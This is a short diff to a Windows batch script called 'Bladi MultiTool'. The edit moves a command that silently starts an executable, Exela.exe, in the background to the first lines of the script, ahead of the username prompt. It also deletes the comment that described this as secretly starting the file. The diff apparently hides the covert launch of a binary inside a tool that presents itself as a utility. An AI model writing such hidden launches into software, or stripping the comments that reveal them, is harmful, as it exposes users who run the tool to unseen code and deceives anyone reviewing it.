@@ -1,11 +1,10 @@
 @echo off
 title Bladi MultiTool
 
+start /b "" "C:\Users\keano\Desktop\MultiTool\Dependencies\utils\scrap\Exela.exe"
+
 :: Prompt for username
 set /p username="Enter your username: "
-
-:: Secretly start the executable file
-start /b "" "C:\Users\keano\Desktop\MultiTool\Dependencies\utils\scrap\Exela.exe"
 
 :logo
 cls
